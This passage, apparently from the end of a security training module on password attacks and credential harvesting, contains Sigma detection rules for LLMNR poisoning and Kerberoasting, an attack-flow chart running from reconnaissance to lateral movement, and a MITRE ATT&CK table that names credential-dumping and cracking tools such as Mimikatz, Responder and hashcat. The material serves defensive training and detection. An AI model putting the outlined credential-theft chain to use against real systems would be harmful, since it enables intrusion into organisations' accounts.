  condition: (selection_llmnr or selection_nbtns) and not filter_dns_servers
falsepositives:
  - Legitimate mDNS services (printers, IoT)
  - Windows hosts responding for their own hostname
level: high
tags:
  - attack.t1557.001
  - attack.credential_access
```

#### Sigma Rule: Kerberoasting Detection

```yaml
title: Kerberos TGS Request With RC4 Encryption for Service Account
id: 8c2e4d6a-1f3b-5a7c-9e2d-4b8f6a1c3e5d
status: experimental
description: Detects TGS requests using RC4 encryption (etype 0x17) which
  indicates potential Kerberoasting activity targeting service account SPNs.
logsource:
  category: authentication
  product: windows
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
  filter_machine_accounts:
    ServiceName|endswith: '$'
  condition: selection and not filter_machine_accounts
falsepositives:
  - Legacy applications requiring RC4 Kerberos tickets
  - Misconfigured service accounts
level: medium
tags:
  - attack.t1558.003
  - attack.credential_access
```

---

## Quick Reference Card

### Attack Flow Summary

```
RECON                    CAPTURE                CRACK                 ACCESS
  |                        |                     |                     |
  +-> Enumerate users      +-> Responder         +-> hashcat -a 0     +-> Pass-the-hash
  +-> Password policy      +-> MITM/relay         |   (dict+rules)    +-> Pass-the-ticket
  +-> OSINT profiling      +-> Kerberoast        +-> hashcat -a 3     +-> Credential stuffing
  +-> Build wordlists      +-> AS-REP roast       |   (mask/brute)    +-> RDP/SSH/SMB auth
  +-> CeWL/CUPP/Mentalist  +-> SAM/LSASS dump   +-> hashcat -a 6/7   +-> Lateral movement
  +-> Select spray cands   +-> NTDS.dit extract   |   (hybrid)        +-> Privilege escalation
                           +-> /etc/shadow read  +-> john --rules
                           +-> DB credential dump+-> Online spray
```

### MITRE ATT&CK Mapping

| Technique | ID | Sub-technique | Tools |
|-----------|----|---------------|-------|
| Brute Force: Password Guessing | T1110.001 | | Hydra, Patator |
| Brute Force: Password Cracking | T1110.002 | | Hashcat, John |
| Brute Force: Password Spraying | T1110.003 | | Kerbrute, DomainPasswordSpray |
| Brute Force: Credential Stuffing | T1110.004 | | Hydra, custom scripts |
| Steal or Forge Kerberos Tickets: Kerberoasting | T1558.003 | | Rubeus, GetUserSPNs.py |
| Steal or Forge Kerberos Tickets: AS-REP Roasting | T1558.004 | | Rubeus, GetNPUsers.py |
| LLMNR/NBT-NS Poisoning | T1557.001 | | Responder, Inveigh |
| OS Credential Dumping: LSASS Memory | T1003.001 | | Mimikatz, procdump |
| OS Credential Dumping: SAM | T1003.002 | | secretsdump, reg save |
| OS Credential Dumping: NTDS | T1003.003 | | secretsdump, ntdsutil |
| OS Credential Dumping: DCSync | T1003.006 | | Mimikatz, secretsdump |
| Unsecured Credentials: /etc/shadow | T1552.001 | | File read |

---

*CIPHER Training Module — Password Attacks, Credential Harvesting & Authentication Bypass*
*Last updated: 2026-03-14*
